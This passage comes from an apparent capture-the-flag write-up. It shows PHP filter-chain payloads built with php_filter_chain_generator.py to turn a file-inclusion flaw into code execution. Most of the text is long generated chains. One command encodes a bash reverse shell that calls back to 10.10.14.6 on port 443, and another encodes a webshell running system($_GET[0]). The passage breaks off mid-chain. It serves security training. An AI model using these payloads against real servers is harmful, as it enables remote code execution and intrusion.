+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+</span></code></pre></div></div>
+<p>I’ll paste that output in replacing “home” in the URL in Firefox, and it works:</p>
+<picture>
+<source srcset="/img/image-20230628173501591.webp" type="image/webp"/>
+<img alt="image-20230628173501591" class="include_image" loading="lazy" src="/img/image-20230628173501591.png"/>
+</picture>
+<h4 id="shell">Shell</h4>
+<p>I’ll generate a new payload to return a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'&lt;?php system("bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1 \""); ?&gt;'</span>
+<span class="go">[+] The following gadget chain will generate the following code : &lt;?php system("bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1 \""); ?&gt; (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIFwiIik7ID8+)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
+</span></code></pre></div></div>
+<p>Unfortunately, on submitting that, it fails:</p>
+<picture>
+<source srcset="/img/image-20230628174035851.webp" type="image/webp"/>
+<img alt="image-20230628174035851" class="include_image" loading="lazy" src="/img/image-20230628174035851.png"/>
+</picture>
+<p>Still, I’ll pick a shorter payload, one that just creates a webshell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python php_filter_chain_generator.py <span class="nt">--chain</span> <span class="s1">'&lt;?php system($_GET[0]); ?&gt;'</span>
+<span class="go">[+] The following gadget chain will generate the following code : &lt;?php system($_GET[0]); ?&gt; (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.ba